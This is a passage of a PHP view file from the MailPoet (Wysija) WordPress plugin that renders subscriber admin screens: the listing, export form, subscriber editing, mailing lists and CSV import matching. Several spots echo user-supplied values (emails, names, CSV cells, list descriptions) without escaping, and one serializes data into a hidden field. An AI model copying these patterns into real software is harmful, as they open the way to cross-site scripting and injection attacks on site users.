		    // $header .= '<th class="manage-column column-date' . $last_clicked_sorting . '" id="last_clicked" scope="col"><a href="#" class="orderlink" ><span>' . __('Last click', WYSIJA) . '</span><span class="sorting-indicator"></span></a></th>';

		    $header .= '</tr>';
		    echo $header;
		    ?>
		</thead>
		<tfoot>
		       <?php
		       echo $header;
		       ?>
		</tfoot>
		       <?php if ($data['show_batch_select'])
		       { ?>
	    	<tr class="batch-select">
	    	    <td colspan="5">
	    		<input type="radio" name="wysija[user][force_select_all]" id="force_select_all" style="display:none;" />
	    		<input type="hidden" name="wysija[user][timestamp]" value="<?php echo $data['max_create_at']; ?>"/>
	    		<div class="force_to_select_all_link" style="display:none">
			   <?php _e('All subscribers on this page are selected.', WYSIJA); ?>
	    		    <a href="javascript:void(0);"><?php echo sprintf(__('Select all %1$s subscribers.', WYSIJA), $data['current_counts']); ?></a>
	    		</div>
	    		<div class="clear_select_all" style="display:none">
			   <?php echo sprintf(__('All %1$s subscribers are selected.', WYSIJA), $data['current_counts']); ?>
	    		    <a><?php echo __('Clear selection', WYSIJA); ?></a>
	    		</div>
	    	    </td>
	    	</tr>
	<?php } ?>

		<tbody class="list:<?php echo $this->model->table_name.' '.$this->model->table_name.'-list" id="wysija-'.$this->model->table_name.'"' ?>>

		<?php
		$listingRows = '';
		$alt = true;

		$statuses = array('-1' => __('Unsubscribed', WYSIJA), '0' => __('Unconfirmed', WYSIJA), '1' => __('Subscribed', WYSIJA));

		$config = WYSIJA::get('config', 'model');
		if (!$config->getValue('confirm_dbleoptin'))
		    $statuses['0'] = $statuses['1'];

		$links_helper = WYSIJA::get('links', 'helper');
		foreach ($data['subscribers'] as $row)
		{
		    $classRow = '';
		    if ($alt)
			$classRow = ' class="alternate" ';
		    ?>
	    	       <tr <?php echo $classRow ?> >

	    	       <th scope="col" class="check-column" >
	        <input type="checkbox" name="wysija[user][user_id][]" id="user_id_<?php echo $row['user_id'] ?>" value="<?php echo esc_attr($row['user_id']) ?>" class="checkboxselec" />
	        </th>
	        <td class="username column-username">
		<?php
		echo get_avatar($row['email'], 32);
		echo '<strong>'.$row['email'].'</strong>';
		echo '<p style="margin:0;">'.$row['firstname'].' '.$row['lastname'].'</p>';
		?>
	    	<div class="row-actions">
	    	    <span class="edit">
	    		<a href="<?php echo $links_helper->detailed_subscriber($row['user_id']); ?>" class="submitedit"><?php _e('View stats or edit', WYSIJA) ?></a>
	    	    </span>
	    	</div>
	        </td>
	        <td><?php
	    if (isset($row['lists']))
	    {
		echo $row['lists'];
		if (isset($row['unsub_lists']))
		    echo ' / ';
	    }

	    if (isset($row['unsub_lists']))
		echo '<span class="wysija-unsubscribed-on" title="'.__('Lists to which the subscriber was subscribed.', WYSIJA).'">'.$row['unsub_lists'].'</span>';
	    ?></td>
	        <td><?php echo $statuses[$row['status']]; ?></td>
	        <td><?php echo $this->fieldListHTML_created_at($row['created_at']) ?></td>
	        <!--td><?php // echo $this->fieldListHTML_created_at($row['last_opened']) ?></td-->
	        <!--td><?php // echo $this->fieldListHTML_created_at($row['last_clicked']) ?></td-->
	        </tr><?php
			$alt = !$alt;
		    }
		    ?>

	    </tbody>
	</table>
	</div>

			    <?php
			    echo $hiddenOrder;
			}

			function export($data)
			{
			    /* make a list of fields to export */
			    ?>
	<form name="submitexport" method="post" id="submitexport" action="" class="form-valid">
	    <table class="form-table">
		<tbody>
	<?php
	if (!isset($data['subscribers']))
	{//select a list and export
	    /* set the filters necessary to export
	     * 1-export a list
	     * 2-export all
	     * 3-export confirmed
	     * 4-export
	     */

	    $formObj = WYSIJA::get('forms', 'helper');
	    $config = WYSIJA::get('config', 'model');
	    ?>
	    	    <tr>
	    		<th><label for="filterlist"><?php _e("Pick a list", WYSIJA); ?></label></th>
	    		<td>
	    <?php
	    $lists_html = '';
	    foreach ($data['lists'] as $listK => $list)
	    {
		$lists_html .= '<label><input type="checkbox" name="wysija[export][filter][list][]" checked="checked" class="validate[minCheckbox[1]] checkbox" value="'.esc_attr($list['list_id']).'" />';
		$lists_html .= '&nbsp;'.$list['name'];
		$lists_html .= ' <span class="count-confirmed-only">('.$list['subscribers'].')</span>';
		$lists_html .= '<span class="count-all">('.((int) $list['belonging']).')</span>';
		$lists_html .= '</label>';
	    }

	    echo $lists_html;
	    ?>
	    		</td>
	    	    </tr>
	    	    <tr>
	    		<th><label for="exportformat"><?php _e("Format", WYSIJA); ?></label></th>
	    		<td>
	    		    <input type="radio" id="export_format1" value="," checked="checked" name="wysija[export][format]">
	    		    <label for="export_format1"><?php _e('CSV file', WYSIJA); ?></label>
	    		    <input type="radio" id="export_format2" value=";" name="wysija[export][format]">
	    		    <label for="export_format2"><?php _e('Excel for Windows', WYSIJA); ?></label>
	    		</td>
	    	    </tr>
				<?php
				if ($config->getValue('confirm_dbleoptin'))
				{
				    ?>
			    <tr>
				<th><label for="confirmedcheck"><?php _e("Export confirmed subscribers only", WYSIJA); ?></label></th>
				<td>
				    <input type="checkbox" name="wysija[export][filter][confirmed]" checked="checked" value="1" id="confirmedcheck" />
				</td>
			    </tr>
		<?php
	    }
	}
	elseif (!empty($data['user']['timestamp']) && !empty($data['user']['force_select_all']) && (bool) $data['user']['force_select_all'])
	{ //batch-select and export
	    if (!empty($data['filter']) && is_array($data['filter']))
		foreach ($data['filter'] as $k => $v)
		    echo '<input type="hidden" value="'.$v.'" name="wysija[filter]['.$k.']" />';
	    foreach ($data['user'] as $k => $v)
		if ($k != 'user_id') // we don't ask for user_id in case of batch-select
		    echo '<input type="hidden" value="'.$v.'" name="wysija[user]['.$k.']" />';
	}
	?>
		    <tr>
			<th scope="row">
			    <label for="listfields"><?php _e('List of fields to export', WYSIJA); ?></label>
			</th>
			<td>
	<?php
	$model_user_field = WYSIJA::get('user_field', 'model');
	$fields = $model_user_field->getFields();

	$helper_forms = WYSIJA::get('forms', 'helper');
	echo $helper_forms->checkboxes(array('class' => 'validate[minCheckbox[1]] checkbox', 'name' => 'wysija[export][fields][]', 'id' => 'wysijafields'), $fields);
	?>
			</td>
		    </tr>
		</tbody>
	    </table>
	    <p class="submit">
		<input type="hidden" name="wysija[export][user_ids]" id="user_ids" value="<?php if (isset($data['subscribers'])) echo base64_encode(serialize($data['subscribers'])) ?>" />
		<input type="hidden" value="export_get" name="action" />
		<input type="submit" value="<?php echo esc_attr(__('Export', WYSIJA)) ?>" class="button-primary wysija">
	    </p>
	</form>
	<?php
    }

    function add($data = false)
    {
	$this->buttonsave = __('Save', WYSIJA);
	if (!$data['user'] || isset($this->add))
	{

	    $this->buttonsave = __('Add Subscriber', WYSIJA);
	}

	$formid = 'wysija-'.$_REQUEST['action'];
	?>
	<form name="<?php echo $formid ?>" method="post" id="<?php echo $formid ?>" action="" class="form-valid">

	    <table class="form-table">
		<tbody>
		    <tr>
			<th scope="row">
			    <label for="email"><?php _e('Email', WYSIJA); ?></label>
			</th>
			<td>
			    <input type="text" size="40" class="validate[required,custom[email]]" id="email" value="<?php if ($data['user']) echo esc_attr($data['user']['details']['email']) ?>" name="wysija[user][email]" />
			</td>
		    </tr>

		    <tr>
			<th scope="row">
			    <label for="fname"><?php _e('First name', WYSIJA); ?></label>
			</th>
			<td>
			    <input type="text" size="40" id="fname" value="<?php if ($data['user']) echo esc_attr($data['user']['details']['firstname']) ?>" name="wysija[user][firstname]" />
			</td>
		    </tr>

		    <tr>
			<th scope="row">
			    <label for="lname"><?php _e('Last name', WYSIJA); ?></label>
			</th>
			<td>
			    <input type="text" size="40" id="lname" value="<?php if ($data['user']) echo esc_attr($data['user']['details']['lastname']) ?>" name="wysija[user][lastname]" />
			</td>
		    </tr>
		    <tr>
			<th scope="row">
			    <label for="user-status" ><?php _e('Status', WYSIJA); ?></label>
			</th>
			<td>
			    <?php
			    $form_obj = WYSIJA::get('forms', 'helper');
			    $user_status = 1;
			    $config = WYSIJA::get('config', 'model');
			    if ($config->getValue("confirm_dbleoptin"))
			    {
				$statusddp = array('1' => __('Subscribed', WYSIJA), '0' => __('Unconfirmed', WYSIJA), '-1' => __('Unsubscribed', WYSIJA));
				if ($data['user'])
				    $user_status = $data['user']['details']['status'];
			    }else
			    {
				$statusddp = array('1' => __('Subscribed', WYSIJA), '-1' => __('Unsubscribed', WYSIJA));
				if ($data['user'])
				{
				    if ((int) $data['user']['details']['status'] == 0)
				    {
					$user_status = 1;
				    }
				    else
				    {
					$user_status = $data['user']['details']['status'];
				    }
				}
			    }


			    echo "<p>".$form_obj->radios(
				    array('id' => 'user-status', 'name' => 'wysija[user][status]'), $statusddp, $user_status, ' class="validate[required]" ')."</p>";
			    ?>
			</td>
		    </tr>
		    <tr>
			<th scope="row">
			    <label for="lists" class="title"><?php _e('Lists', WYSIJA); ?></label>

			</th>
			<td>
			    <?php
			    $field_html = '';
			    $field = 'list';
			    $valuefield = array();
			    if ($data['user'] && isset($data['user']['lists']))
			    {

				foreach ($data['user']['lists'] as $list)
				{
				    $valuefield[$list['list_id']] = $list;
				}
			    }

			    $_display_style = 2; // 1 = 1 column, 2 = float left
	            usort( $data['list'], array( $this, 'sort_by_name' ) );

			    foreach ($data['list'] as $list)
			    {

				$checked = false;
				$extra_checkbox = $hidden_field = '';

				if (isset($valuefield[$list['list_id']]))
				{
				    //if the subscriber has this list and is not unsubed then we check the checkbox
				    if ($valuefield[$list['list_id']]['unsub_date'] <= 0)
				    {
					$checked = true;
				    }
				    else
				    {
					//we keep a reference of the list to which we are unsubscribed
					$hidden_field = $form_obj->hidden(array('id' => $field.$list['list_id'], 'name' => 'wysija[user_list][unsub_list][]', 'class' => 'checkboxx'), $list['list_id']);
					$hidden_field.=' / <span class="wysija-unsubscribed-on"> '.sprintf(__('Unsubscribed on %1$s', WYSIJA), date('D, j M Y H:i:s', $valuefield[$list['list_id']]['unsub_date'])).'</span>';
				    }
				}

				$checkout_params = array('id' => $field.$list['list_id'], 'name' => "wysija[user_list][list_id][]", 'class' => '');
				$checkbox = $form_obj->checkbox($checkout_params, $list['list_id'], $checked, $extra_checkbox) . "<label for='list{$list['list_id']}'>{$list['name']}</label>";

				if ($_display_style == 1)
				{
				    $field_html.= '<p><label for="'.$field.$list['list_id'].'">';
				    $field_html.=$checkbox;
				    $field_html.=$hidden_field;
				    $field_html.='</label></p>';
				}
				else
				{
				    $field_html .= '<p class="labelcheck">';
				    $field_html .= $checkbox;
				    $field_html .= $hidden_field;
				    $field_html .= '</p>';
				}
			    }


			    echo $field_html;
			    ?>
			</td>
		    </tr>
	<?php
	/*
	  Custom Fields.
	 */
	echo WJ_FieldRender::render_all(
		$data['user']['details']['user_id']
	);
	?>
		    <tr class='submit_row'>
			<td colspan='2'>
	<?php $this->secure(array('action' => "save", 'id' => $data['user']['details']['user_id'])); ?>
			    <input type="hidden" name="wysija[user][user_id]" id="user_id" value="<?php echo esc_attr($data['user']['details']['user_id']) ?>" />
			    <input type="hidden" value="save" name="action" />
			    <input type="submit" value="<?php echo esc_attr($this->buttonsave) ?>" class="button-primary wysija">
			</td>
		    </tr>
		</tbody>
	    </table>
	</form>
	<?php
    }

    // @todo: move to a helper
    function subscribers_stats($htmlContent, $data)
    {
	$htmlContent = '';

	if (count($data['charts']['stats']) > 0)
	{
	    $htmlContent.= '<p>';
	    $helper_licence = WYSIJA::get('licence', 'helper');
	    $url_checkout = $helper_licence->get_url_checkout('subscriber_stats');
	    $htmlContent.= str_replace(
		    array('[link]', '[/link]'), array('<a title="'.__('Get Premium now', WYSIJA).'" target="_blank" href="'.$url_checkout.'">', '</a>'), __("Note: Find out what this subscriber opened and clicked with our [link]Premium version.[/link]", WYSIJA));
	    $htmlContent.= '</p>';
	}
	return $htmlContent;
    }

    function edit($data)
    {
	// loop to show the core lists to which the user is subscribed to
	// @todo: we should move this block to controller, or at least a separated function
	foreach ($data['list'] as $keyl => $list)
	{
	    if (!$list['is_enabled'])
	    {
		//make sure this lists is in the user lists
		foreach ($data['user']['lists'] as $ulist)
		{
		    if ($list['list_id'] == $ulist['list_id'])
		    {
			continue(2);
		    }
		}
		unset($data['list'][$keyl]);
	    }
	}
	?>
	<div id="hook_subscriber_left" class="hook-column left-column hook">
		<?php $this->add($data); ?>
		<?php if (!empty($data['hooks']['hook_subscriber_left'])) echo $data['hooks']['hook_subscriber_left']; ?>
	</div>
		<?php if (!empty($data['hooks']['hook_subscriber_right']))
		{ ?>
	    <div id="hook_subscriber_right" class="hook-column right-column hook">
			<?php echo $data['hooks']['hook_subscriber_right']; ?>
	    </div>
		    <?php } ?>
	<?php if (!empty($data['hooks']['hook_subscriber_bottom']))
	{ ?>
	    <div id="hook_subscriber_bottom" class="hook"><?php echo $data['hooks']['hook_subscriber_bottom']; ?></div>
	    <?php
	}
    }

    function globalActionsLists($data = false)
    {
	?>
	<div class="tablenav">

		<?php $this->pagination("&action=lists"); ?>
	    <div class="clear"></div>
	</div>
	<?php
    }

    /*
     * main view when editing lists it has one listing and one form
     */

    function lists($data)
    {
	echo '<form method="post" action="" id="posts-filter">';
	$this->globalActionsLists($data);
	?>
	<div class="list">
	    <table cellspacing="0" class="widefat fixed" >
		<thead>
		    <tr class="thead">
			<th class="manage-column column-name" id="name-list" scope="col" style="width:30%;"><?php _e('Name', WYSIJA) ?></th>
			<th class="manage-column column-subscribed" id="subscribed-list" scope="col"><?php _e('Subscribed', WYSIJA) ?></th>
	<?php
	$config = WYSIJA::get("config", "model");
	if ($config->getValue("confirm_dbleoptin"))
	{
	    ?><th class="manage-column column-unsubscribed" id="unconfirmed-list" scope="col"><?php _e('Unconfirmed', WYSIJA) ?></th><?php
	}
	?>

			<th class="manage-column column-unsubscribed" id="unsubscribed-list" scope="col"><?php _e('Unsubscribed', WYSIJA) ?></th>
	    <?php /* <th class="manage-column column-campaigns" id="campaigns-list" scope="col"><?php _e('Newsletters sent',WYSIJA) ?></th> */ ?>
			<th class="manage-column column-date" id="date-list" scope="col" style="width:15%;"><?php _e('Date created', WYSIJA) ?></th>
		    </tr>
		</thead>

		<tbody class="list:<?php echo $this->model->table_name.' '.$this->model->table_name.'-list" id="wysija-'.$this->model->table_name.'"' ?>>
	<?php
	$listingRows = "";
	$alt = true;
	foreach ($data['list'] as $row => $columns)
	{
	    $classRow = "";
	    if ($alt)
		$classRow = ' class="alternate" ';
	    ?>
	    	       <tr <?php echo $classRow ?> >
	    	       <td class="manage-column column-name"  scope="col">
	        <strong><a href="admin.php?page=wysija_subscribers&id=<?php echo $columns['list_id'] ?>&action=editlist" class="submitedit"><?php
	    echo $columns['name'];
	    ?></a></strong>
	        <div class="row-actions">
	    	<span class="edit">
	    	    <a href="admin.php?page=wysija_subscribers&id=<?php echo $columns['list_id'] ?>&action=editlist" class="submitedit"><?php _e('Edit', WYSIJA) ?></a> |
	    	</span>
	    	<span class="duplicate">
	    	    <a href="admin.php?page=wysija_subscribers&id=<?php echo $columns['list_id'] ?>&action=duplicatelist" class="submitduplicate"><?php _e('Duplicate', WYSIJA) ?></a>
	    	</span>
	    <?php if ($columns['namekey'] != "users"): ?>
			|
			<span class="delete">
			    <a href="admin.php?page=wysija_subscribers&id=<?php echo $columns['list_id'] ?>&action=deletelist&_wpnonce=<?php echo $this->secure(array("action" => "deletelist", "id" => $columns['list_id']), true); ?>" class="submitdelete"><?php _e('Delete', WYSIJA) ?></a>
			</span>
	    <?php
	    endif;
	    if (!$columns['is_enabled']):
		?>
			|
			<span class="synch">
			    <a href="admin.php?page=wysija_subscribers&id=<?php echo $columns['list_id'] ?>&action=synchlist&_wpnonce=<?php echo $this->secure(array("action" => "synchlist", "id" => $columns['list_id']), true); ?>" class="submitsynch"><?php _e('Update', WYSIJA) ?></a>
			</span>
		<?php
	    endif;
	    global $current_user;

	    if ($columns['namekey'] == 'users' && !$columns['is_enabled'] && is_multisite() && is_super_admin($current_user->ID)):
		?>
			|
			<span class="synchtotal">
			    <a href="admin.php?page=wysija_subscribers&id=<?php echo $columns['list_id'] ?>&action=synchlisttotal&_wpnonce=<?php echo $this->secure(array("action" => "synchlisttotal", "id" => $columns['list_id']), true); ?>" class="submitsynch"><?php _e('Get all MS users', WYSIJA) ?></a>
			</span>
	    <?php endif; ?>
		    <?php if (!$columns['is_enabled'] && $columns['namekey'] != 'users'): ?>
			|
		    <?php endif; ?>
	    	<span class="view_subscribers">
	    	    <a href="admin.php?page=wysija_subscribers&filter-list=<?php echo $columns['list_id'] ?>">| <?php _e('View subscribers', WYSIJA) ?></a>
	    	</span>
	        </div>

	        </td>
	        <td class="manage-column column-subscribed"  scope="col"><?php echo $columns['subscribers'] ?></td>
	    <?php
	    if ($config->getValue("confirm_dbleoptin"))
	    {
		?><td class="manage-column column-unconfirmed"  scope="col"><?php echo $columns['unconfirmed'] ?></td><?php
	    }
	    ?>

	        <td class="manage-column column-unsubscribed"  scope="col"><?php echo $columns['unsubscribers'] ?></td>
	    <?php /* <td class="manage-column column-campaigns"  scope="col"><?php echo $columns['campaigns_sent'] ?></td> */ ?>
	        <td class="manage-column column-date"  scope="col"><?php echo $this->fieldListHTML_created_at($columns['created_at']) ?></td>
	        </tr>
	    <?php
	    $alt = !$alt;
	}
	?>

	    </tbody>
	</table>
	</div>
	<?php
	echo '</form>';
    }

    function addList($data)
    {
	$this->editList($data);
    }

    function editList($data)
    {
	?>
	<div class="form">

	    <form class="form-valid" action="admin.php?page=wysija_subscribers&action=lists<?php if ($data['form']['list_id']) echo "&id=".$data['form']['list_id'] ?>" id="wysija-edit" method="post" name="wysija-edit">

		<input type="hidden" name="wysija[list][list_id]" id="list_id" value="<?php echo esc_attr($data['form']['list_id']) ?>">
		<table class="form-table">
		    <tbody>
			<tr>
			    <th scope="row">
				<label for="list-name"><?php _e('Name', WYSIJA); ?> </label>
			    </th>
			    <td>
				<input type="text" size="40" class="validate[required]" id="list-name" value="<?php echo esc_attr($data['form']['name']) ?>" name="wysija[list][name]" />
			    </td>
			</tr>
			<tr>
			    <th scope="row">
				<label for="list-desc"><?php _e('Description', WYSIJA); ?> </label>
		    <p class="description"><?php _e('For your own use and never shown to your subscribers.', WYSIJA); ?></p>
		    </th>
		    <td>
			<textarea type="text" cols="40" rows="3" id="list-desc" name="wysija[list][description]" /><?php echo $data['form']['description'] ?></textarea>
		    </td>
		    </tr>
		    </tbody>
		</table>
	<?php
	if ($_REQUEST['action'] == "editlist")
	{
	    $buttonName = __('Update list', WYSIJA);
	}
	else
	{
	    $buttonName = __('Add list', WYSIJA);
	}
	?>
		<p class="submit">
	<?php $this->secure(array('action' => "savelist", 'id' => $data['form']['list_id'])); ?>
		    <input type="hidden" value="savelist" name="action" />
		    <input type="submit" value="<?php echo esc_attr($buttonName) ?>" class="button-primary wysija">
		</p>
	    </form>
	</div>
	<?php
    }

    function import($data)
    {
	$helperNumbers = WYSIJA::get('numbers', 'helper');
	$data = $helperNumbers->get_max_file_upload();
	$bytes = $data['maxmegas'];
	?>
	<div class="form">
	    <form class="form-valid" action="admin.php?page=wysija_subscribers&action=lists" id="wysija-edit" enctype="multipart/form-data" method="post" name="wysija-edit">
		<table class="form-table">
		    <tbody>

			<tr>
			    <th scope="row">
				<label for="redirect"><?php _e('How do you want to import?', WYSIJA); ?> </label>
			    </th>
			    <td>
				<p>
				    <label for="copy-paste">
					<input type="radio" class="validate[required]" id="copy-paste" value="copy" name="wysija[import][type]" ><?php _e('Copy paste in a text box', WYSIJA); ?>
				    </label>
				    <label for="upload-file">
					<input type="radio" class="validate[required]" id="upload-file" value="upload" name="wysija[import][type]"><?php _e('Upload a file', WYSIJA); ?>
				    </label>
	<?php
	$config = WYSIJA::get('config', "model");
	$importPossible = $config->getValue("pluginsImportableEgg");
	$importedalready = $config->getValue("pluginsImportedEgg");
	if (is_array($importPossible))
	{
	    foreach ($importPossible as $tableName => $pluginInfos)
	    {
		if (is_array($importedalready) && in_array($tableName, $importedalready))
		    continue;
		?>
					    <label for="import-from-plugin-<?php echo $tableName; ?>">
						<a class="button-secondary2" id="import-from-plugin-<?php echo $tableName; ?>" href="admin.php?page=wysija_subscribers&action=importplugins">
				    <?php echo sprintf(__('Import from %1$s', WYSIJA), '<strong>"'.$pluginInfos['name'].'"</strong>'); ?>
						</a>
					    </label>
				    <?php
				}
			    }
			    ?>
				</p>
			    </td>
			</tr>

			<tr class="csvmode copy">
			    <th scope="row" >
				<label for="csvtext"><?php _e('Then paste your list here', WYSIJA); ?> </label>
		    <p class="description"><?php echo str_replace(array("[link]", "[/link]"), array('<a target="_blank" href="http://support.mailpoet.com/knowledgebase/importing-subscribers-with-a-csv-file/?utm_source=wpadmin&utm_campaign=import">', '</a>'), __('This needs to be in CSV style or a simple paste from Gmail, Hotmail or Yahoo. See [link]examples in our support site[/link].', WYSIJA)) ?></p>
		    </th>
		    <td>
			<textarea type="text" style="width:500px;" cols="130" rows="10" class="validate[required]" id="csvtext" name="wysija[user_list][csv]" /></textarea>
			<p class="fieldsmatch"></p>
		    </td>
		    </tr>

		    <tr class="csvmode upload">
			<th scope="row" >
			    <label for="csvfile"><?php _e('Upload a file', WYSIJA); ?> </label>
		    <p class="description"><?php echo str_replace(array("[link]", "[/link]"), array('<a target="_blank" href="http://support.mailpoet.com/knowledgebase/importing-subscribers-with-a-csv-file/?utm_source=wpadmin&utm_campaign=import file">', '</a>'), __('This needs to be in CSV style. See [link]examples in our support site[/link].', WYSIJA)) ?></p>
		    </th>
		    <td>
			<input type="file" name="importfile" size="50" />( <?php echo sprintf(__('total max upload file size : %1$s', WYSIJA), $bytes) ?> )
			<p class="fieldsmatch"></p>
		    </td>
		    </tr>

		    <tr>
			<th scope="row" colspan="2">
			    <label for="redirect"><?php _e('Did these subscribers ask to be in your list?', WYSIJA); ?> </label>
		    <p class="description">
			    <?php _e('If the answer is "no", consider yourself a spammer.', WYSIJA); ?><br />
			    <?php echo str_replace(array("[link]", "[/link]"), array('<a target="_blank" href="http://support.mailpoet.com/knowledgebase/dont-import-subscribers-who-didnt-sign-up/#utm_source=wpadmin&utm_campaign=importwarning">', '</a>'), __('[link]Read more on support.mailpoet.com[/link].', WYSIJA)) ?>
		    </p>
		    </th>
		    </tr>
		    </tbody>
		</table>

		<p class="submit">
		    <input type="hidden" value="importmatch" name="action" />

		    <input type="submit" value="<?php echo esc_attr(__('Next step', WYSIJA)) ?>" class="button-primary wysija">

		</p>
	    </form>
	</div>

	    <?php
	}

	function importmatch($data)
	{
	    ?>
	<form class="form-valid" action="admin.php?page=wysija_subscribers&action=lists" id="wysija-edit" method="post"  name="wysija-edit">
	    <div class="list" style="overflow:auto">
		<table cellspacing="0" class="widefat fixed" >
		    <thead>
			<tr class="thead">
			    <th id="first-row"><?php _e('Match data', WYSIJA); ?></th>
			    <?php
			    $columns = array(
				'nomatch' => __('Ignore column...', WYSIJA),
				'email' => __('Email', WYSIJA),
				'firstname' => __('First name', WYSIJA),
				'lastname' => __('Last name', WYSIJA),
				'ip' => __('IP address', WYSIJA),
				'status' => __('Status', WYSIJA));

			    $WJ_Field = new WJ_Field();
			    $custom_fields = $WJ_Field->get_all();

			    $extended_columns = array();
			    if (!empty($custom_fields))
			    {
				foreach ($custom_fields as $row)
				{
				    $extended_columns['cf_'.$row->id] = $row->name;
				}
			    }


			    $helper_form = WYSIJA::get('forms', 'helper');
			    $i = 0;

			    $email_column_matched = false;
			    $this->new_column_can_be_imported = array();

			    $data['csv'][0] = array_map('trim', $data['csv'][0]);

			    foreach ($data['csv'][0] as $column_key => $column_name)
			    {
				$selected = '';



				$columns_array = $columns;
				// we make a key out of the column name
				$column_name_key = str_replace(array(' ', '-', '_'), '', strtolower($column_name));

				// we try to automatically match columns with previous matches recorded in the past
				$import_fields = get_option('wysija_import_fields');
				if (isset($import_fields[$column_name_key]))
				{
				    $selected = $import_fields[$column_name_key];
				}
				else
				{

				    // we're making the matches dropdown with an extra value 'Import as "name of the column"'
				    // since we didn't detect it in the previously matched columns
				    $columns_array = array();
				    foreach ($columns as $col_key => $col_val)
				    {
					// we need to put that extra value right after the ignore column value
					if (count($columns_array) === 1) {
					    $columns_array['new_field|input|'.$column_name] = sprintf(__('Import as "%1$s"', WYSIJA), $column_name);
					    $columns_array['new_field|date|'.$column_name] = sprintf(__('Import "%1$s" as date field', WYSIJA), $column_name);
					    $this->new_column_can_be_imported[$column_key] = true;
					}
					else
					{
					    $columns_array[$col_key] = $col_val;
					}
				    }
				}

				// if it is an email column we set it by default as email
				if (!$email_column_matched && isset($data['keyemail'][$column_key]))
				{
				    $selected = 'email';
				    $email_column_matched = true;
				    $columns_array = $columns;
				}
				$columns_array = array_map('trim', array_merge($columns_array, $extended_columns));


				// we're building one dropdown per column
				$dropdown = '<div class="match-dropdown">'.$helper_form->dropdown(array('id' => 'column-match-'.$i, 'name' => 'wysija[match]['.$i.']', 'class' => 'create_extra row-'.$column_key), $columns_array, $selected).'</div>';
				/**
				 * We need to improve the import, fields come back to options for columns later on.
				if (isset($this->new_column_can_be_imported[$column_key])) {
					$dropdown .= '<div class="import-new-field" id="column-match-date-wrap-'.$i.'"><input id="column-match-date-'.$i.'"  type="checkbox" name="wysija[ignore_invalid_date]['.$i.']"\><label for="column-match-date-'.$i.'">' . __('Ignore invalid dates', WYSIJA) . '</label></div>';
				}
				*/
				echo '<th>'.$dropdown.'</th>';
				$i++;
			    }
			    ?>
			</tr>
		    </thead>

		    <tbody class="list:<?php echo $this->model->table_name.' '.$this->model->table_name.'-list" id="wysija-'.$this->model->table_name.'"' ?>>

	    <?php
	    $listingRows = '';
	    $alt = true;
	    $i = 0;
	    foreach ($data['csv'] as $columns)
	    {
		$classRow = '';
		if ($alt)
		    $classRow = ' class="alternate" ';

		echo "<tr $classRow>";
		if (isset($data['firstrowisdata']))
		{
		    $j = $i + 1;
		}
		else
		    $j = $i;

		if ($i == 0)
		{
		    $valuefrow = '';

		    if (isset($data['firstrowisdata']))
		    {
			$valuefrow = '1<input value="1" type="hidden" id="firstrowdata" name="firstrowisdata"  />';
		    }
		    echo '<td>'.$valuefrow.'</td>';
		    //echo '<td><label for="firstrowdata" class="title" title="'.__("This line is not a header description, it is data and needs to be inserted!",WYSIJA).'"><input '.$checked.' type="checkbox" id="firstrowdata" name="firstrowisdata"  />'.__("Insert line!",WYSIJA).'</label></td>';
		}
		else
		    echo '<td>'.$j.'</td>';

		foreach ($columns as $key_col => $val)
		{
		    if ($i == 0 && !isset($data['firstrowisdata']))
			echo '<td><strong>'.$val.'</strong></td>';
		    else
		    {
			if (!empty($this->new_column_can_be_imported[$key_col]))
			{
			    $timestamp = strtotime($val);
			    if ($timestamp > 0)
			    {
				$val_converted = '<span class="converted-field-to-date row-'.$key_col.'" title="'.__('Verify that the date in blue matches the original one.', WYSIJA).'">'.date(get_option('date_format').' '.get_option('time_format'), $timestamp).'</span>';
			    }
			    else
			    {
				$val_converted = '<span class="converted-field-error row-'.$key_col.'" title="'.__('Do not match as a \'date field\' if most of the rows for that column return the same error.', WYSIJA).'">'.__('Error matching date.', WYSIJA).'</span>';
			    }
			    $val = ' <span class="imported-field">'.$val.'</span>'.$val_converted;
			}
			echo '<td>'.$val.'</td>';
		    }
		}
		echo '</tr>';

		$alt = !$alt;
		$i++;
	    }

	    if ($data['totalrows'] > 3)
	    {
		?>

	    		   <tr class="alternate" >
		<?php
		echo '<td>...</td>';
		foreach ($data['csv'][0] as $col)
		{
		    echo '<td>...</td>';
		}
		?>
	    		   </tr>
	    		<tr><td><?php echo $data['totalrows'] ?></td>
	    <?php
	    foreach ($data['lastrow'] as $key_col => $val)
	    {
		if (!empty($this->new_column_can_be_imported[$key_col]))
		{
		    $timestamp = strtotime($val);
		    if ($timestamp > 0)
		    {
			$val_converted = '<span class="converted-field-to-date row-'.$key_col.'" title="'.__('Verify that the date in blue matches the original one.', WYSIJA).'">'.date(get_option('date_format').' '.get_option('time_format'), $timestamp).'</span>';
		    }
		    else
		    {
			$val_converted = '<span class="converted-field-error row-'.$key_col.'" title="'.__('Do not match as a \'date field\' if most of the rows for that column return the same error.', WYSIJA).'">'.__('Error matching date.', WYSIJA).'</span>';
		    }
		    $val = ' <span class="imported-field">'.$val.'</span>'.$val_converted;
		}
		echo '<td>'.$val.'</td>';
	    }
	    ?>
	    		</tr>
		<?php
	    }
	    ?>
		    </tbody>
		</table>
	    </div>
	<?php
	if ($data['errormatch'])
	{

	}
	else
	{
	    ?>
	        <table class="form-table">
	    	<tbody>
	    	    <tr>
	    		<th scope="row">
	    		    <label for="name"><?php _e('Pick one or many lists', WYSIJA); ?> </label>
	    	<p class="description"><?php _e('Pick the lists you want to import those subscribers to.', WYSIJA); ?> </p>
	    	</th>
	    	<td>
	    <?php
	    //create an array of existing lists to import within
	    $model_list = WYSIJA::get('list', 'model');
	    $lists = $model_list->get(array('name', 'list_id'), array('is_enabled' => 1));
	    //first value is to create new list
	    $lists[] = array('name' => __('New list', WYSIJA), 'list_id' => 0);

	    //create an array of active(status 99) follow_up emails aossicated to a list_id
	    $helper_email = WYSIJA::get('email', 'helper');
	    $follow_ups_per_list = $helper_email->get_active_follow_ups(array('subject', 'params'));

	    $follow_up_name_per_list = array();
	    foreach ($follow_ups_per_list as $list_id => $follow_ups)
	    {
		if (!isset($follow_up_name_per_list[$list_id]))
		    $follow_up_name_per_list[$list_id] = array();
		foreach ($follow_ups as $follow_up)
		{
		    $follow_up_name_per_list[$list_id][] = $follow_up['subject'];
		}
	    }

	    $helper_form = WYSIJA::get('forms', 'helper');
	    //field name for processing
	    $field = 'list';
	    $fieldHTML = '<div>';
	    foreach ($lists as $list)
	    {
		if ($list['list_id'] == 0)
		{
		    $fieldHTML.= '<p><label for="'.$field.$list['list_id'].'">';
